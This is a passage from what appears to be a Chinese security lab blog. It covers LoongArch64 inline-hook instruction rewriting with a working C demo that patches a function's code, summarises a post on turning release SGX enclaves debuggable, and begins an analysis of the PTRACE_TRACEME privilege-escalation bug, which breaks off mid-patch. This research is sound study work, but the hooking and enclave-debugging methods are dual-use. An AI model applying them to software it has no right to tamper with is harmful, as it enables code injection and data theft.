class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"0x%lx\n"</span>, sign_extend(<span class="number">0x80</span>, <span class="number">8</span>)); 	<span class="comment">// 0xffffffffffffff80</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"0x%lx\n"</span>, sign_extend(<span class="number">0x80</span>, <span class="number">9</span>));	<span class="comment">// 0x80</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="PC-相对寻址指令替换"><a href="#PC-相对寻址指令替换" class="headerlink" title="PC 相对寻址指令替换"></a>PC 相对寻址指令替换</h2><p>inline hook 的主要工作之一就是修复这类指令，即计算出正确的地址，然后通过其他指令替换</p>
<p>LoongArch64 中的PC相对寻址指令如下:</p>
<p>算数运算指令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PCADDI rd, si20 	| 0 0 0 1 1 0 0 si20 rd</span><br><span class="line">PCALAU12I rd, si20 	| 0 0 0 1 1 0 1 si20 rd</span><br><span class="line">PCADDU12I rd, si20 	| 0 0 0 1 1 1 0 si20 rd</span><br><span class="line">PCADDU18I rd, si20 	| 0 0 0 1 1 1 1 si20 rd</span><br></pre></td></tr></table></figure>

<p>转移指令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">BEQZ rj, offs 		| 0 1 0 0 0 0 offs[15:0] rj offs[20:16]</span><br><span class="line">BNEZ rj, offs 		| 0 1 0 0 0 1 offs[15:0] rj offs[20:16]</span><br><span class="line">BCEQZ cj, offs 		| 0 1 0 0 1 0 offs[15:0] 0 0 cj offs[20:16]</span><br><span class="line">BCNEZ cj, offs 		| 0 1 0 0 1 0 offs[15:0] 0 1 cj offs[20:16]</span><br><span class="line"><span class="meta">#</span><span class="bash"> JIRL rd, rj, offs	| 0 1 0 0 1 1 offs[15:0] rj rd              (唯一一个不是PC相对寻址的转移指令)  </span></span><br><span class="line">B offs 			| 0 1 0 1 0 0 offs[15:0] offs[25:16]</span><br><span class="line">BL offs 		| 0 1 0 1 0 1 offs[15:0] offs[25:16]</span><br><span class="line">BEQ rj, rd, offs 	| 0 1 0 1 1 0 offs[15:0] rj rd</span><br><span class="line">BNE rj, rd, offs	| 0 1 0 1 1 1 offs[15:0] rj rd</span><br><span class="line">BLT rj, rd, offs	| 0 1 1 0 0 0 offs[15:0] rj rd</span><br><span class="line">BGE rj, rd, offs	| 0 1 1 0 0 1 offs[15:0] rj rd</span><br></pre></td></tr></table></figure>

<p>对这两类的指令替换方案如下:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pcaddi [target_reg], si20 替换为:</span><br><span class="line"></span><br><span class="line">PCADDI r17, 12/4		# 将 pc + 12 存放到 r17 临时寄存器</span><br><span class="line">LD.D [target_reg], r17, 0	# 取出 r17 地址处的 8 个字节保存到 target_reg</span><br><span class="line">B 12/4				# 跳过存放地址的8个字节，即 pc += 12，由于指令会对偏移移位，所以要12/4</span><br><span class="line">IMM[ 0: 31]  			# 基于原指令pc 计算得到的结果低32bit</span><br><span class="line">IMM[32: 63]			# 基于原指令pc 计算得到的结果高32bit</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">b offs 替换为:</span><br><span class="line"></span><br><span class="line">PCADDI R17, 12/4	# 将 pc + 12 存放到 r17 临时寄存器</span><br><span class="line">LD.D R17, R17, 0	# 取出 r17 地址处的 8 个字节保存到 r17</span><br><span class="line">JIRL R0, R17, 0		# 跳转到 r17 保存的地址处</span><br><span class="line">TO_ADDR[0 : 31]		# 基于原指令pc 计算得到的跳转地址低32bit</span><br><span class="line">TO_ADDR[32: 63]  	# 基于原指令pc 计算得到的跳转地址高32bit</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 条件跳转类的替换方式如下:</span></span><br><span class="line">BEQ rj, rd, offs 替换为:</span><br><span class="line"></span><br><span class="line">BNE rj, rd, 24/4</span><br><span class="line">PCADDI R17, 12/4</span><br><span class="line">LD.D R17, R17, 0</span><br><span class="line">JIRL R0, R17, 0</span><br><span class="line">TO_ADDR[0 : 31]</span><br><span class="line">TO_ADDR[32: 63]</span><br></pre></td></tr></table></figure>

<h2 id="r1寄存器"><a href="#r1寄存器" class="headerlink" title="r1寄存器"></a>r1寄存器</h2><p>有时函数栈的切换不会把返回值压栈，而是直接使用r1寄存器</p>
<p>经测试，当一个函数没有调用子函数的时候，不会把 r1 压栈</p>
<p>开启gcc 编译优化也会省去压栈操作</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.c</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func1</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func2</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> func1(a, b) + <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">	func1(<span class="number">100</span>, <span class="number">200</span>);</span><br><span class="line">	func2(<span class="number">100</span>, <span class="number">200</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$ gcc main.c -g</span><br><span class="line">$ gdb a.out</span><br><span class="line">(gdb) disassemble func1</span><br><span class="line">Dump of assembler code for function func1:</span><br><span class="line">   0x0000000120000650 &lt;+0&gt;:	addi.d	$r3,$r3,-32(0xfe0)</span><br><span class="line">   0x0000000120000654 &lt;+4&gt;:	st.d	$r22,$r3,24(0x18)</span><br><span class="line">   0x0000000120000658 &lt;+8&gt;:	addi.d	$r22,$r3,32(0x20)</span><br><span class="line">   0x000000012000065c &lt;+12&gt;:	move	$r13,$r4</span><br><span class="line">   0x0000000120000660 &lt;+16&gt;:	move	$r12,$r5</span><br><span class="line">   0x0000000120000664 &lt;+20&gt;:	slli.w	$r13,$r13,0x0</span><br><span class="line">   0x0000000120000668 &lt;+24&gt;:	st.w	$r13,$r22,-20(0xfec)</span><br><span class="line">   0x000000012000066c &lt;+28&gt;:	slli.w	$r12,$r12,0x0</span><br><span class="line">   0x0000000120000670 &lt;+32&gt;:	st.w	$r12,$r22,-24(0xfe8)</span><br><span class="line">   0x0000000120000674 &lt;+36&gt;:	ld.w	$r13,$r22,-20(0xfec)</span><br><span class="line">   0x0000000120000678 &lt;+40&gt;:	ld.w	$r12,$r22,-24(0xfe8)</span><br><span class="line">   0x000000012000067c &lt;+44&gt;:	add.w	$r12,$r13,$r12</span><br><span class="line">   0x0000000120000680 &lt;+48&gt;:	move	$r4,$r12</span><br><span class="line">   0x0000000120000684 &lt;+52&gt;:	ld.d	$r22,$r3,24(0x18)</span><br><span class="line">   0x0000000120000688 &lt;+56&gt;:	addi.d	$r3,$r3,32(0x20)</span><br><span class="line">   0x000000012000068c &lt;+60&gt;:	jirl	$r0,$r1,0</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disassemble func2</span><br><span class="line">Dump of assembler code for function func2:</span><br><span class="line">   0x0000000120000690 &lt;+0&gt;:	addi.d	$r3,$r3,-32(0xfe0)</span><br><span class="line">   0x0000000120000694 &lt;+4&gt;:	st.d	$r1,$r3,24(0x18)</span><br><span class="line">...</span><br><span class="line">   0x00000001200006d8 &lt;+72&gt;:	ld.d	$r1,$r3,24(0x18)</span><br><span class="line">   0x00000001200006dc &lt;+76&gt;:	ld.d	$r22,$r3,16(0x10)</span><br><span class="line">   0x00000001200006e0 &lt;+80&gt;:	addi.d	$r3,$r3,32(0x20)</span><br><span class="line">   0x00000001200006e4 &lt;+84&gt;:	jirl	$r0,$r1,0</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ gcc main.c -O2 -g</span><br><span class="line">$ gdb a.out</span><br><span class="line">Dump of assembler code for function func1:</span><br><span class="line">   0x0000000120000658 &lt;+0&gt;:	add.w	$r4,$r4,$r5</span><br><span class="line">   0x000000012000065c &lt;+4&gt;:	jirl	$r0,$r1,0</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disassemble func2</span><br><span class="line">Dump of assembler code for function func2:</span><br><span class="line">   0x0000000120000660 &lt;+0&gt;:	add.w	$r4,$r4,$r5</span><br><span class="line">   0x0000000120000664 &lt;+4&gt;:	addi.w	$r4,$r4,10(0xa)</span><br><span class="line">   0x0000000120000668 &lt;+8&gt;:	jirl	$r0,$r1,0</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<h2 id="用户态Hook"><a href="#用户态Hook" class="headerlink" title="用户态Hook"></a>用户态Hook</h2><p>简单实现，不处理pc相对寻址的情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JUMP_CODE_SIZE 20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> (*func_ptr)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(a == <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s-%d: %d\n"</span>, __func__, __LINE__, a+b+c);</span><br><span class="line">	<span class="keyword">return</span> a+b+c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hook_handler</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s-%d: %d, %d, %d\n"</span>, __func__, __LINE__, a, b, c);</span><br><span class="line">	func_ptr(a, b, c);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">char</span> *<span class="title">do_jump</span><span class="params">(<span class="keyword">char</span> *from, <span class="keyword">char</span> *to)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> rd, rj, off;</span><br><span class="line">        <span class="keyword">int</span> inst_pcaddi, inst_jirl, inst_ld_d;</span><br><span class="line">        <span class="keyword">int</span> to_addr_low, to_addr_high;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// PCADDI rd, si20 | 0 0 0 1 1 0 0 si20 rd</span></span><br><span class="line">        rd = <span class="number">17</span>;</span><br><span class="line">        off = <span class="number">12</span> &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        inst_pcaddi = <span class="number">0x0c</span> &lt;&lt; (<span class="number">32</span> - <span class="number">7</span>) | off &lt;&lt; <span class="number">5</span> | rd ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// LD.D rd, rj, si12 | 0 0 1 0 1 0 0 0 1 1 si12 rj rd</span></span><br><span class="line">        rd = <span class="number">17</span>;</span><br><span class="line">        rj = <span class="number">17</span>;</span><br><span class="line">        off = <span class="number">0</span>;</span><br><span class="line">        inst_ld_d = <span class="number">0xa3</span> &lt;&lt; <span class="number">22</span> | off &lt;&lt; <span class="number">10</span> | rj &lt;&lt; <span class="number">5</span> | rd ;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// JIRL rd, rj, offs | 0 1 0 0 1 1 offs[15:0] rj rd</span></span><br><span class="line">        rd = <span class="number">0</span>;</span><br><span class="line">        rj = <span class="number">17</span>;</span><br><span class="line">        off = <span class="number">0</span>;</span><br><span class="line">        inst_jirl = <span class="number">0x13</span> &lt;&lt; <span class="number">26</span> | off &lt;&lt; <span class="number">10</span> | rj &lt;&lt; <span class="number">5</span>| rd;</span><br><span class="line"></span><br><span class="line">        to_addr_low = (<span class="keyword">int</span>)((<span class="keyword">long</span>)to &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">        to_addr_high = (<span class="keyword">int</span>)((<span class="keyword">long</span>)to &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">int</span> *)from = inst_pcaddi;</span><br><span class="line">        *(<span class="keyword">int</span> *)(from + <span class="number">4</span>) = inst_ld_d;</span><br><span class="line">        *(<span class="keyword">int</span> *)(from + <span class="number">8</span>) = inst_jirl;</span><br><span class="line">        *(<span class="keyword">int</span> *)(from + <span class="number">12</span>) = to_addr_low;</span><br><span class="line">        *(<span class="keyword">int</span> *)(from + <span class="number">16</span>) = to_addr_high;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> from + <span class="number">20</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_MASK (~(page_size-1))</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">post_hook</span><span class="params">(<span class="keyword">void</span> *target, <span class="keyword">void</span> *handler)</span></span>&#123;	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> stolen = JUMP_CODE_SIZE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> *trampoline = mmap(<span class="literal">NULL</span>, <span class="number">128</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// turn [ trampoline pointer ] into [ hook target function pointer ]</span></span><br><span class="line">	func_ptr = (<span class="keyword">int</span> (*)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>))trampoline;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// copy changed inst [ target: target+stolen ] </span></span><br><span class="line">	<span class="built_in">memcpy</span>(trampoline, target, stolen);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// jump from [ trampoline + stolen ] to [ target + stolen ]</span></span><br><span class="line">	do_jump(trampoline+stolen, target+stolen);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// [ target ] jump to [ handler ]</span></span><br><span class="line">	<span class="comment">// 没有这个mprotect调用会出现段错误</span></span><br><span class="line">	mprotect((<span class="keyword">void</span>*)((<span class="keyword">long</span>)target &amp; PAGE_MASK), page_size, PROT_READ|PROT_WRITE|PROT_EXEC);</span><br><span class="line">	do_jump(target, handler);</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">	post_hook((<span class="keyword">void</span> *)func, (<span class="keyword">void</span> *)hook_handler);</span><br><span class="line">	func(<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="内核态Hook"><a href="#内核态Hook" class="headerlink" title="内核态Hook"></a>内核态Hook</h2><p>我们实现了完整的处理各种异常条件的内核 LA inlineHook, 暂不公开</p>
<h1 id="反汇编器"><a href="#反汇编器" class="headerlink" title="反汇编器"></a>反汇编器</h1><p>有LoongArch64 机器的情况下，直接用gdb就可以做到</p>
<p>用一个简单的脚本实现:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">opcodes =  <span class="string">","</span>.join(hex(i) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="number">0x28c0208c</span>, <span class="number">0x28c0c18c</span>, <span class="number">0x24000d8c</span>, <span class="number">0x0348018c</span>, <span class="number">0x44008980</span>])</span><br><span class="line"></span><br><span class="line">c_code = <span class="string">"""</span></span><br><span class="line"><span class="string">int opcodes[] = &#123; %s &#125;;</span></span><br><span class="line"><span class="string">void main() &#123; ((void (*)() )opcodes)(); &#125;</span></span><br><span class="line"><span class="string">"""</span> % opcodes</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">"main.c"</span>, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(c_code)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">"gcc main.c -g"</span>)</span><br><span class="line">os.system(<span class="string">"gdb -batch -ex 'file a.out' -ex 'disassemble/rs opcodes'"</span>)</span><br><span class="line">os.system(<span class="string">"rm main.c a.out"</span>)</span><br></pre></td></tr></table></figure>

<p>效果如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;t.py</span><br><span class="line">Dump of assembler code for function opcodes:</span><br><span class="line">   0x0000000120008000 &lt;+0&gt;:	8c 20 c0 28	ld.d	$r12,$r4,8(0x8)</span><br><span class="line">   0x0000000120008004 &lt;+4&gt;:	8c c1 c0 28	ld.d	$r12,$r12,48(0x30)</span><br><span class="line">   0x0000000120008008 &lt;+8&gt;:	8c 0d 00 24	ldptr.w	$r12,$r12,12(0xc)</span><br><span class="line">   0x000000012000800c &lt;+12&gt;:	8c 01 48 03	andi	$r12,$r12,0x200</span><br><span class="line">   0x0000000120008010 &lt;+16&gt;:	80 89 00 44	bnez	$r12,136(0x88) # 0x120008098</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<p>在没有 LoongArch64 机器的情况下，需要用软件（反汇编器）实现 LA 指令的反汇编，为了达到这个目的，我们正在开发支持 LA 的反汇编器，后续合适的时机可能会公开。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://github.com/loongson/LoongArch-Documentation/releases/latest/download/LoongArch-Vol1-v1.00-CN.pdf" target="_blank" rel="noopener">LoongArch64 指令手册</a></p>
<p><a href="https://pan.educg.net/api/v3/file/get/3858/20210404-%E5%BC%A0%E7%A6%8F%E6%96%B0-loongarch.pdf?sign=o-I4vKLPH-WqqXD8AmGkEK3PraV3kdOkAgXbZPL7t4A%3D%3A0" target="_blank" rel="noopener">LoongArch 指令集介绍.pdf</a>  </p>
<p><a href="https://loongarch.dev/zh-cn/" target="_blank" rel="noopener">LoongArch 官博</a>    </p>
<p><a href="https://github.com/loongson" target="_blank" rel="noopener">龙芯 github 地址</a>  </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2021/09/24/LoongArch/" data-id="cmd5slr2f000h0lo127ytaqv8" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2020/07/06/窥探有方——调试Released SGX Enclave" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2020/07/06/%E7%AA%A5%E6%8E%A2%E6%9C%89%E6%96%B9%E2%80%94%E2%80%94%E8%B0%83%E8%AF%95Released%20SGX%20Enclave/" class="article-date">
  <time datetime="2020-07-06T00:00:00.000Z" itemprop="datePublished">2020-07-06</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2020/07/06/%E7%AA%A5%E6%8E%A2%E6%9C%89%E6%96%B9%E2%80%94%E2%80%94%E8%B0%83%E8%AF%95Released%20SGX%20Enclave/">窥探有方——调试Released SGX Enclave</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author : <a href="http://weibo.com/suezi86" target="_blank">suezi(@suezi86)</a> of IceSword Lab , Qihoo 360</p>
<p>  Intel Software Guard Extensions (Intel SGX)是基于CPU扩展的一种革命性的安全技术,旨在提供具有最小攻击面的硬件辅助的可信执行环境。它允许应用程序或应用程序的一部分运行在一个称为Enclave的安全容器中，任何应用程序，包括OS、Hypervisor、BIOS均无法访问其内容。Enclave使用的页面和数据结构由CPU内部的MEE加密存储在EPC中，负责映射Enclave页面的页表由OS管理，但OS无法获取其内容，仅Enclave可访问。然而攻击者总是想方设法以直接或间接的方式来获取数据，比如隐私数据，加密密钥，或者篡改代码的执行流。分析SGX的工作模型，设法将Release版本的Enclave转换成Debug版本，再借助SGX开发套件中的sgx-gdb工具，可实现对SGX Enclave的动态调试，之后便可为所欲为。详见<a href="https://www.anquanke.com/post/id/209744" target="_blank" rel="noopener">窥探有方——调试Released SGX Enclave</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2020/07/06/%E7%AA%A5%E6%8E%A2%E6%9C%89%E6%96%B9%E2%80%94%E2%80%94%E8%B0%83%E8%AF%95Released%20SGX%20Enclave/" data-id="cmd5slr2h000j0lo1135qgb4v" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2019/11/28/CVE-2019-13272" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2019/11/28/CVE-2019-13272/" class="article-date">
  <time datetime="2019-11-25T00:00:00.000Z" itemprop="datePublished">2019-11-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2019/11/28/CVE-2019-13272/">PTRACE_TRACEME 本地提权漏洞解析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>author: Gengjia Chen (<a href="mailto:chengjia4574@gmail.com">chengjia4574@gmail.com</a>) of IceSword Lab, qihoo 360</p>
<p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1903" target="_blank" rel="noopener">PTRACE_TRACEME 漏洞</a> 是 Jann Horn 201907 月发现的内核提权漏洞, 漏洞发现和利用的思路有很多值得学习的地方, 本文记录了个人的学习过程</p>
<h2 id="漏洞补丁"><a href="#漏洞补丁" class="headerlink" title="漏洞补丁"></a>漏洞补丁</h2><p>我们从漏洞补丁 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6994eefb0053799d2e07cd140df6c2ea106c41ee" target="_blank" rel="noopener">ptrace: Fix -&gt;ptracer_cred handling for PTRACE_TRACEME</a> 入手分析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Fix two issues:</span><br><span class="line"></span><br><span class="line">// 第一个问题，是 cred 的 rcu reference 问题</span><br><span class="line">When called <span class="keyword">for</span> PTRACE_TRACEME, ptrace_link() would obtain an RCU   </span><br><span class="line">reference to the parent<span class="string">'s objective credentials, then give that pointer</span></span><br><span class="line"><span class="string">to get_cred().  However, the object lifetime rules for things like</span></span><br><span class="line"><span class="string">struct cred do not permit unconditionally turning an RCU reference into</span></span><br><span class="line"><span class="string">a stable reference.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 第二个问题，tracee 记录的 tracer 的 cred 的问题</span></span><br><span class="line"><span class="string">PTRACE_TRACEME records the parent'</span>s credentials as <span class="keyword">if</span> the parent was </span><br><span class="line">acting as the subject, but that<span class="string">'s not the case.  If a malicious</span></span><br><span class="line"><span class="string">unprivileged child uses PTRACE_TRACEME and the parent is privileged, and</span></span><br><span class="line"><span class="string">at a later point, the parent process becomes 